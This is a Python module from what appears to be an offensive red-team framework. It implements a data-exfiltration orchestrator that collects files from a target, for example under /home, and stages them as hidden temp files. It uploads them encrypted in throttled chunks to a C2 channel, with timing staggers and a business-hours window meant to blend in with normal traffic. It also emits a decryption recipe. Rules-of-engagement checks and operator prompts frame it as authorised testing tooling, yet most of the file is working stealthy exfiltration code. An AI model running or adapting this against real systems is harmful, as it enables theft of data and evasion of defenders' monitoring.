"""
forge/utils/post/transfer_util.py
Canonical: forge/phase5/exfiltration.py — Module 5-H

Exfiltrator: orchestrates collector selection, throttling, time-window enforcement,
compression, encryption, and C2 channel upload.

Design constraints:
  - File contents NEVER logged to engagement DB or audit_log. Metadata only.
  - questionary.confirm() with data category and estimated volume before any collection.
  - Time-window gate (--window 09:00-17:00): blocks exfil outside business hours.
  - Rate throttle: default 50 KB/s; configurable via --rate.
  - Stagger: DEFAULT_STAGGER = 2.0 s between file reads; 30 s pause per 100 files.
  - Chunks ≤ 4 MB uploaded per C2 transaction; retry on channel failure.
  - Staging to existing writable subdirectories — never new top-level dirs.
  - CyberChef verification recipe emitted post-collection (operator-side).
  - ExfilMonitor registration after confirmed upload (paste-site surveillance).
  - All staging paths registered with cleanup.py before first write.
  - FORGE_OFFLINE_STRICT=1 suppresses all upload operations.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import sqlite3
import time
from datetime import datetime, time as dtime
from pathlib import Path
from typing import Optional
from forge.db.direct_connect import direct_connect  # noqa: E402  # PRAGMA-configured wrapper for bare sqlite3.connect

_LOG = logging.getLogger(__name__)

DEFAULT_RATE_BYTES_PER_SEC = 50 * 1024  # 50 KB/s
DEFAULT_CHUNK_SIZE = 4 * 1024 * 1024  # 4 MB
DEFAULT_WINDOW_START = dtime(9, 0)
DEFAULT_WINDOW_END = dtime(17, 0)


# ── Time-window enforcement ────────────────────────────────────────────────────


def _check_time_window(
    window_start: dtime = DEFAULT_WINDOW_START,
    window_end: dtime = DEFAULT_WINDOW_END,
) -> None:
    """Block exfil outside operator-configured time window."""
    now = datetime.now().time()
    if not (window_start <= now <= window_end):
        raise RuntimeError(
            f"Exfiltration blocked outside time window "
            f"{window_start}–{window_end}. Current time: {now}. "
            "Wait for the window to open or pass --window to override."
        )


# ── Rate throttle ─────────────────────────────────────────────────────────────


class ThrottledUploader:
    """
    Rate-limited channel uploader. Caps upload speed to max_bytes_per_sec.
    Splits data into chunks ≤ chunk_size bytes. Retries on transient failures.
    """

    def __init__(
        self,
        channel,
        max_bytes_per_sec: int = DEFAULT_RATE_BYTES_PER_SEC,
        chunk_size: int = DEFAULT_CHUNK_SIZE,
        max_retries: int = 3,
    ) -> None:
        self._channel = channel
        self._rate = max_bytes_per_sec
        self._chunk_sz = chunk_size
        self._retries = max_retries

    def upload(self, data: bytes) -> bool:
        """Upload data in rate-limited chunks. Returns True if all chunks succeeded."""
        offline = os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")
        if offline:
            _LOG.debug("FORGE_OFFLINE_STRICT: upload suppressed.")
            return False

        chunks = [data[i : i + self._chunk_sz] for i in range(0, len(data), self._chunk_sz)]
        success = True

        for idx, chunk in enumerate(chunks):
            sent = False
            for attempt in range(self._max_retries + 1):
                start = time.monotonic()
                if self._channel.send(chunk):
                    sent = True
                    break
                wait = min(2**attempt, 32)
                _LOG.debug(
                    "Upload chunk %d failed (attempt %d); retry in %ds", idx, attempt + 1, wait
                )
                time.sleep(wait)

            if not sent:
                _LOG.error("Upload chunk %d failed after %d retries.", idx, self._retries)
                success = False
                continue

            # Rate throttle: sleep to maintain target bytes/sec
            elapsed = time.monotonic() - start
            expected = len(chunk) / self._rate
            if expected > elapsed:
                time.sleep(expected - elapsed)

        return success

    @property
    def _max_retries(self) -> int:
        return self._retries


# ── CyberChef recipe emitter ───────────────────────────────────────────────────


def emit_cyberchef_recipe(session_key_hex: str, output_path: Path) -> None:
    """
    Write a CyberChef decryption recipe for operator-side verification.
    Recipe: AES-256-GCM decrypt → Gunzip.
    Key is sensitive — register output with cleanup.py immediately.
    """
    recipe = {
        "op": "AES Decrypt",
        "args": {
            "key": {"option": "Hex", "string": session_key_hex},
            "iv": {"option": "Hex", "string": ""},
            "mode": "GCM",
            "input": "Raw",
        },
    }
    steps = [
        recipe,
        {"op": "Gunzip", "args": []},
    ]
    output_path.write_text(json.dumps(steps, indent=2), encoding="utf-8")
    _LOG.info(
        "CyberChef recipe written: %s (contains key material — clean up post-op)", output_path
    )
    try:
        from forge.shared.cleanup import register_cleanup_file

        register_cleanup_file(output_path)
    except ImportError:
        pass


# ── ExfilMonitor registration ──────────────────────────────────────────────────


def register_exfil_monitor(
    db_path: Path,
    engagement_id: int,
    sha256_list: list[str],
) -> None:
    """
    Register collected file SHA-256 hashes with ExfilMonitor for paste-site surveillance.
    Called after confirmed upload. SHA-256 only — no content.
    """
    try:
        con = direct_connect(db_path)
        for sha in sha256_list:
            con.execute(
                """INSERT OR IGNORE INTO exfil_monitor_targets
                   (engagement_id, sha256, registered_at)
                   VALUES (?, ?, datetime('now'))""",
                (engagement_id, sha),
            )
        con.commit()
        con.close()
        _LOG.info(
            "ExfilMonitor: registered %d SHA-256 hashes for paste-site monitoring.",
            len(sha256_list),
        )
    except sqlite3.OperationalError:
        _LOG.debug("exfil_monitor_targets table not present — skipping ExfilMonitor registration.")


# ── Main orchestrator ──────────────────────────────────────────────────────────

from forge.utils.post.collectors import COLLECTOR_REGISTRY


def _require_roe(roe_id: str | None, *, action_name: str) -> str:
    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[
        :160
    ]
    if not normalized:
        raise RuntimeError(f"{action_name} requires roe_id or FORGE_ROE_ID before live execution.")
    return normalized


class Exfiltrator:
    """
    Orchestrate data collection, throttled upload, and post-collection registration.

    Usage:
        exfil = Exfiltrator(
            db_path       = Path("engagement.db"),
            engagement_id = 1,
            channel       = http_channel_instance,
            session_key   = "deadbeef...",
            rate          = 50 * 1024,
            window        = (dtime(9,0), dtime(17,0)),
        )
        exfil.run(collector_type="filesystem", root=Path("/home"))
    """

    def __init__(
        self,
        db_path: Path,
        engagement_id: int,
        channel,
        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
        rate: int = DEFAULT_RATE_BYTES_PER_SEC,
        chunk_size: int = DEFAULT_CHUNK_SIZE,
        window: Optional[tuple[dtime, dtime]] = (DEFAULT_WINDOW_START, DEFAULT_WINDOW_END),
        staging_dir: Optional[Path] = None,
        stagger: float = 2.0,
        dry_run: bool = False,
        roe_id: str | None = None,
    ) -> None:
        self._db_path = db_path
        self._engagement_id = engagement_id
        self._channel = channel
        self._session_key = session_key
        self._rate = rate
        self._chunk_size = chunk_size
        self._window = window
        self._staging_dir = staging_dir
        self._stagger = stagger
        self._dry_run = dry_run
        self._roe_id = roe_id
        self._uploader = ThrottledUploader(channel, rate, chunk_size)

    def run(
        self,
        collector_type: str,
        emit_recipe: bool = False,
        validate: bool = False,
        **collector_kwargs,
    ) -> list[str]:
        """
        Execute collection + upload pipeline.

        Args:
            collector_type: One of the registered collector names.
            emit_recipe:    If True, write CyberChef decryption recipe to disk.
            validate:       If True, run validation on collected artifacts.
            **collector_kwargs: Passed to collector constructor (e.g. root=Path("/home")).

        Returns:
            List of SHA-256 hashes of collected files.
        """
        if not self._dry_run:
            self._roe_id = _require_roe(self._roe_id, action_name="exfiltration")

        # 1. Time-window gate
        if self._window:
            _check_time_window(*self._window)

        # 2. Operator confirmation
        self._confirm(collector_type)

        # 3. Build collector
        collector = self._build_collector(collector_type, **collector_kwargs)

        # 4. Discover, collect, and optionally validate
        collected_hashes: list[str] = []
        for artifact in collector.discover():
            collected_file = collector.collect(artifact)
            if collected_file:
                _LOG.info(
                    "Collected: %s (%d bytes)", collected_file.path, collected_file.size_bytes
                )
                collected_hashes.append(collected_file.sha256)

                if not self._dry_run:
                    stage_path = self._staging_dir or collector._staging_dir
                    chunk_path = self._resolve_staged_chunk_path(stage_path, collected_file.sha256)
                    if chunk_path.exists():
                        data = chunk_path.read_bytes()
                        self._uploader.upload(data)
                        del data

                if validate:
                    collector.validate(collected_file)

        # 5. CyberChef recipe
        if emit_recipe and not self._dry_run:
            recipe_path = (self._staging_dir or Path("/tmp")) / ".forge_verify_recipe.json"
            emit_cyberchef_recipe(self._session_key, recipe_path)

        # 6. ExfilMonitor registration
        if collected_hashes and not self._dry_run:
            register_exfil_monitor(self._db_path, self._engagement_id, collected_hashes)

        return collected_hashes

    @staticmethod
    def _resolve_staged_chunk_path(stage_path: Path, sha256: str) -> Path:
        prefix = f".{sha256[:16]}"
        direct_path = stage_path / f"{prefix}.tmp"
        if direct_path.exists():
            return direct_path
        matches = sorted(stage_path.glob(f"{prefix}*.tmp"))
        if matches:
            return matches[0]
        return direct_path

    def _confirm(self, collector_type: str) -> None:
        window_text = "off"
        if self._window:
            window_text = f"{self._window[0]}–{self._window[1]}"
        try:
            import questionary

            confirmed = questionary.confirm(
                f"[Module 5-H] Exfiltration:\n"
                f"  Collector  : {collector_type}\n"
                f"  Rate       : {self._rate // 1024} KB/s\n"
                f"  Window     : {window_text}\n"
                f"  Engagement : {self._engagement_id}\n"
                f"  Dry-run    : {self._dry_run}\n"
                "This will collect and transmit data from the target. Proceed?"
            ).ask()
            if not confirmed:
                raise RuntimeError("Operator cancelled exfiltration.")
        except ImportError:
            pass

    def _build_collector(self, collector_type: str, **kwargs):
        if collector_type not in COLLECTOR_REGISTRY:
            raise ValueError(
                f"Unknown collector: {collector_type!r}. Available: {sorted(COLLECTOR_REGISTRY)}"
            )
        cls = COLLECTOR_REGISTRY[collector_type]
        collector = cls(
            db_path=self._db_path,
            engagement_id=self._engagement_id,
            session_key=self._session_key,
            staging_dir=self._staging_dir,
            stagger=self._stagger,
            **kwargs,
        )
        if hasattr(collector, "configure_execution"):
            collector.configure_execution(roe_id=self._roe_id, require_roe=not self._dry_run)
        return collector
